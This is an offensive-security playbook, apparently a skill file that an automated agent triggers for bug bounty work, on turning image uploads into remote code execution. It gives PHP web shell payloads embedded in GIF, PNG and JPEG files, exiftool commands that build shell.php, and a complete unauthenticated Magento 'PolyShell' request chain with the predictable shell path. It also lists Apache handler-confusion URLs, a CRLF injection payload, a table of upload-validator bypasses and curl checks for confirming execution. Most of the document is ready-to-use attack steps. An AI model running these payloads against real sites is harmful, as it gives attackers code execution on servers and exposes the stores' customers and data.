---
name: polyglot-file-upload-rce
pattern: Polyglot File Upload to RCE
description: "Auto-trigger: file upload with image validation, Magento unauth RCE, PHP polyglot, Apache handler confusion"
tech: [php, apache, magento, generic]
severity: Critical
triggers:
  - /test-upload
  - polyglot upload
  - image upload rce
  - magento rce
  - file upload bypass
related_patterns:
  - file-upload-techniques
  - apache-confusion-attacks
  - windows-bestfit-unicode-attacks
  - python-pth-execution
sources:
  - "SLCyber — Magento PolyShell APSB25-94 (2025-2026)"
  - "Orange Tsai — Apache Confusion CVE-2024-38475 (2024)"
---

# Polyglot File Upload to RCE

## Crown Jewel Targets

- Magento/Adobe Commerce stores (unauth cart upload + GraphQL = pre-auth RCE)
- Any PHP app with image upload using `getimagesize()` without extension validation
- WordPress with plugin file upload endpoints
- E-commerce platforms with guest/unauthenticated upload features
- Apache servers with RewriteRules matching `.php` extension
- CMS systems with avatar/profile photo upload

## Attack Surface Signals

- URL patterns: `/upload`, `/media/`, `/pub/media/`, `/graphql`, `/rest/V1/guest-carts`
- File upload forms accepting images (avatar, product images, custom options)
- Apache with `mod_rewrite` and PHP handler rules
- Magento indicators: `/checkout/`, Spartacus frontend, GraphQL endpoint
- PHP `getimagesize` errors in responses

**Sources:** SLCyber (Magento PolyShell, 2025-2026), Orange Tsai (Apache Confusion, 2024)
**Key CVEs:** APSB25-94 (Magento), CVE-2024-38475 (Apache handler confusion)

## Core Concept

A polyglot file is valid as multiple file types simultaneously (e.g., valid PNG AND valid PHP). This bypasses upload validators that check file content (magic bytes, getimagesize) while the web server executes it as code.

## Technique 1: Image Polyglots

### GIF-PHP Polyglot

```
GIF89a<?php system($_GET['cmd']); ?>
```

`getimagesize()` sees valid GIF header. PHP interpreter ignores binary prefix, executes PHP tags.

### PNG-PHP Polyglot (via EXIF comment)

```bash
# Embed PHP in PNG comment field — keeps image structurally valid
exiftool tiny.png -Comment='<?php echo "RCE:" . system($_GET["cmd"]); ?>' -o polyglot.php
```

Passes `getimagesizefromstring()` AND MIME type validation.

### JPEG-PHP Polyglot

```bash
# Embed in JPEG EXIF data
exiftool image.jpg -Comment='<?php phpinfo(); ?>' -o polyglot.php
```

## Technique 2: Magento PolyShell (Unauth RCE)

### Full Chain

**Step 1:** Get product SKU via GraphQL (no auth):
```http
POST /graphql
{"query":"{ products(search: \"\", pageSize: 1) { items { sku } } }"}
```

**Step 2:** Create guest cart:
```http
POST /rest/default/V1/guest-carts
```

**Step 3:** Upload polyglot as cart item custom option:
```json
{
  "cart_item": {
    "qty": 1,
    "sku": "product_sku",
    "product_option": {
      "extension_attributes": {
        "custom_options": [{
          "option_id": "12345",
          "option_value": "file",
          "extension_attributes": {
            "file_info": {
              "base64_encoded_data": "<base64_polyglot_png>",
              "name": "shell.php",
              "type": "image/png"
            }
          }
        }]
      }
    }
  }
}
```

**Step 4:** Access shell at:
```
/pub/media/custom_options/quote/s/h/shell.php
# Path: /{first_char}/{second_char}/{filename}
```

### Why It Works

`ImageContentValidator::isValid` checks:
- Valid base64 content
- `getimagesizefromstring()` returns valid image properties
- MIME type matches allowed list (image/jpg, image/gif, image/png)
- Filename has no forbidden chars

But does NOT check that file extension matches MIME type. `.php` extension passes because the image content is valid.

## Technique 3: Apache Handler Confusion Upload

When Apache has a RewriteRule matching `.php` files:

```apache
RewriteRule ^(.+\.php)$ $1 [H=application/x-httpd-php]
```

Upload a GIF/PNG file normally, then access via:
```
/uploads/image.gif%3Fooo.php
```

Regex matches `.php` → applies PHP handler → `%3F` truncation removes query → GIF executed as PHP.

## Technique 4: CGI Handler Redirect Upload

Via CRLF injection in any CGI response:
```
/cgi-bin/redir.cgi?r=http://%0d%0aLocation:/uploads/avatar.webp%0d%0aContent-Type:application/x-httpd-php%0d%0a%0d%0a
```

Forces Apache to execute ANY uploaded file as PHP regardless of extension.

## Bypass Techniques for Upload Validators

| Validator | Bypass |
|-----------|--------|
| Extension check | Double extension: `shell.php.jpg` |
| MIME type check | Valid image with embedded PHP |
| `getimagesize()` | Polyglot (valid image structure + PHP payload) |
| `.htaccess` denial | Upload to path without .htaccess coverage |
| Content-Type header | Set correct image Content-Type |
| File size limit | Minimal polyglot (tiny.png + short PHP) |
| Filename sanitization | Unicode normalization bypass (WorstFit) |
| Null byte | `shell.php%00.jpg` (older PHP) |

## Creating Minimal Polyglots

```bash
# Tiny valid PNG (1x1 pixel, ~67 bytes)
echo 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAD0lEQVR4AQEEAPv/AHf66QRGAluYv6aFAAAAAElFTkSuQmCC' | base64 -d > tiny.png

# Add PHP payload via exiftool
exiftool tiny.png -Comment='<?php system($_GET["c"]); ?>' -o shell.php

# Base64 encode for API upload
base64 -w0 shell.php
```

## Detection in Target Applications

Look for:
1. File upload endpoints (REST API, GraphQL mutations, form uploads)
2. Image processing that uses `getimagesize()` without extension validation
3. Guest/unauthenticated upload features (cart options, profile photos, comments)
4. Upload directories accessible via web (check for .htaccess protection)
5. Apache RewriteRules that could enable handler confusion

## Post-Upload Verification

```bash
# Check if PHP executes in upload directory
curl https://target/uploads/test.php
# If 200 with PHP output → RCE confirmed
# If 403 → .htaccess blocking (try bypass)
# If 200 with raw PHP source → PHP not enabled in that dir

# Try accessing via handler confusion
curl https://target/uploads/image.gif%3Fooo.php
```

## Bug Bounty Relevance

- **CRITICAL**: Unauth file upload to RCE (Magento pattern)
- **HIGH**: Auth bypass + polyglot upload on any PHP application
- **HIGH**: Combined with Apache confusion for execution of any uploaded file
- Common in e-commerce platforms, CMS systems, file sharing apps

## Operator Notes (Battle-Tested)

- **Magento PolyShell is pre-auth RCE**: GraphQL product query (no auth) + guest cart (no auth) + polyglot PNG upload with `.php` extension. The chain is entirely unauthenticated.
- **`getimagesize()` is NOT a security check**: It validates image structure, not extension. A file can be both a valid PNG and valid PHP simultaneously.
- **Upload path is predictable**: Magento uses `/{first_char}/{second_char}/{filename}` pattern. `shell.php` goes to `/pub/media/custom_options/quote/s/h/shell.php`.
- **Apache handler confusion is the amplifier**: Even if upload enforces `.gif` extension, `image.gif%3Fooo.php` with a RewriteRule matching `.php` forces PHP handler execution.
- **Minimal polyglot**: `exiftool tiny.png -Comment='<?php system($_GET["c"]); ?>' -o shell.php` creates a valid PNG that executes as PHP. 67 bytes base image.
- **Always verify PHP execution in upload dir**: `curl https://target/uploads/test.php` — 200 with output = game over. 403 = `.htaccess` blocking (try bypass). Raw source = PHP not enabled.

## Related Skills & Chains

| Pattern | Chain Potential |
|---------|---------------|
| `file-upload-techniques` | General upload exploitation |
| `apache-confusion-attacks` | Handler confusion for execution |
| `windows-bestfit-unicode-attacks` | Unicode filename smuggling |
| `python-pth-execution` | Alternative file write to RCE |
| `reverse-proxy-path-confusion` | Path confusion to reach upload dirs |
